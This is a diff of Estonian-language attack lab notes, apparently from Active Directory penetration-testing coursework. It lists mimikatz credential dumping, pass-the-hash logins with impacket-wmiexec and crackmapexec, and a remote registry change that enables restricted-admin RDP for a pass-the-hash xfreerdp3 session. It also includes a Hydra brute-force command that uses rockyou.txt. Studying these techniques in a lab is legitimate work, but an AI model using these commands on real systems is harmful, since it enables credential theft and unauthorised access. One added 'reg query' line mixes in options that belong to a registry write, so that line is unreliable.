@@ -1,4 +1,9 @@
-
+GPO järjekord. Püsima jääb viimane.
+Local
+Site
+Domeen
+OU
+CHILDOU
 
 Linux pw reset:
 boot
@@ -132,8 +137,11 @@ Käivitame mimikatzi (admin term)
   sekurlsa::logonpasswords
     NTLM: c625e3e2756d9ef01881fa7ed46b49a8
 /usr/bin/impacket-wmiexec -hashes :c625e3e2756d9ef01881fa7ed46b49a8 contoso/Administrator@192.168.1.2 (logime hashiga sisse)
-crackmapexec smb 192.168.1.2 -u "Administrator" -H "c625e3e2756d9ef01881fa7ed46b49a8" -x 'reg add HKLM\System\CurrentControlSet\LSA /t REG_WORD /v DisableRestrictedAdmin /d 0x0 /f' (Saadame sihtmärgile registri muudatuse, et lubada RDP)
-sudo xfreerdp3 /v:192.168.1.2 /u:Administrator /pth
+crackmapexec smb 192.168.1.2 -u "Administrator" -H "c625e3e2756d9ef01881fa7ed46b49a8" -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_WORD /v DisableRestrictedAdmin /d 0x0 /f' (Saadame sihtmärgile registri muudatuse, et lubada RDP)
+crackmapexec smb 192.168.1.2 -u "Administrator" -H "c625e3e2756d9ef01881fa7ed46b49a8" -x 'reg query HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin' (Kontrollime kas eelmine käsk toimis)
+crackmapexec smb 192.168.1.2 -u "Administrator" -H "c625e3e2756d9ef01881fa7ed46b49a8" -x 'reg query HKLM\System\CurrentControlSet\Control\Lsa /v LimitBlankPasswordUse /t REG_WORD /d 0x0 /f' (Kontrollime kas eelmine käsk toimis)
+  Registri väärtuse kirjapilt on oluline
+sudo xfreerdp3 /v:192.168.1.2 /u:Administrator /pth:c625e3e2756d9ef01881fa7ed46b49a8 /restricted-admin (loome rdp ühenduse)
 
 hydra -V -f -l Administrator -P /home/user/Documents/rockyou.txt rdp://192.168.1.2 (Proovime kräkida Administraator parooli)
 
